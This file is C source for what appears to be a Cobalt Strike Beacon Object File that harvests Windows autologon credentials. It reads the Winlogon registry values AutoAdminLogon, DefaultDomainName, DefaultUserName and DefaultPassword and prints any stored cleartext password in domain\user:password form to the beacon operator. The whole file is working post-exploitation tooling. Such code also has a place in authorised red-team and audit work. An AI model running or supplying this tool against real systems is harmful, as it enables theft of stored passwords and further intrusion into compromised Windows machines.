#include <windows.h>
#include <stdio.h>
#include "beacon.h"
#include "bofdefs.h"

void go() {
    HKEY hKey = NULL;
    DWORD dwSize = 0;
    DWORD dwType = 0;
    char szAutoLogon[16] = {0};
    char szUserName[256] = {0};
    char szDomain[256] = {0};
    char szPassword[256] = {0};
    BOOL bAutoLogonFound = FALSE;
    BOOL bUserNameFound = FALSE;
    BOOL bDomainFound = FALSE;
    BOOL bPasswordFound = FALSE;
    LONG lResult = 0;

    lResult = ADVAPI32$RegOpenKeyExA( HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_READ, &hKey );
    if (lResult != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] Failed to open Winlogon registry key (error: 0x%lX)\n", lResult);
        return;
    }

    dwSize = sizeof(szAutoLogon);
    lResult = ADVAPI32$RegQueryValueExA(hKey, "AutoAdminLogon", NULL, &dwType, (LPBYTE)szAutoLogon, &dwSize);
    if (lResult == ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] AutoAdminLogon: %s\n", szAutoLogon);
        bAutoLogonFound = TRUE;
    }

    dwSize = sizeof(szDomain);
    lResult = ADVAPI32$RegQueryValueExA(hKey, "DefaultDomainName", NULL, &dwType, (LPBYTE)szDomain, &dwSize);
    if (lResult == ERROR_SUCCESS && szDomain[0] != '\0') {
        BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] DefaultDomainName: %s\n", szDomain);
        bDomainFound = TRUE;
    }

    dwSize = sizeof(szUserName);
    lResult = ADVAPI32$RegQueryValueExA(hKey, "DefaultUserName", NULL, &dwType, (LPBYTE)szUserName, &dwSize);
    if (lResult == ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] DefaultUserName: %s\n", szUserName);
        bUserNameFound = TRUE;
    }

    dwSize = sizeof(szPassword);
    lResult = ADVAPI32$RegQueryValueExA(hKey, "DefaultPassword", NULL, &dwType, (LPBYTE)szPassword, &dwSize);
    if (lResult == ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] DefaultPassword: %s\n", szPassword);
        bPasswordFound = TRUE;
    }

    if (!bAutoLogonFound) {
        BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] AutoAdminLogon: Not Found\n");
    }
    if (!bUserNameFound) {
        BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] DefaultUserName: Not Found\n");
    }
    if (!bPasswordFound) {
        BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] DefaultPassword: Not Found\n");
    }

    if (bAutoLogonFound && szAutoLogon[0] == '1' && bPasswordFound) {
        if (bDomainFound) {
            BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] VULNERABLE: Autologon credentials stored: %s\\%s:%s\n", szDomain, szUserName, szPassword);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] VULNERABLE: Autologon credentials stored: %s:%s\n", szUserName, szPassword);
        }
    } else if (bAutoLogonFound && szAutoLogon[0] == '1') {
        BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] AutoAdminLogon enabled but no DefaultPassword found. Password may be in LSA secrets.\n");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] Not vulnerable: Autologon not enabled or no credentials stored\n");
    }

    ADVAPI32$RegCloseKey(hKey);
}
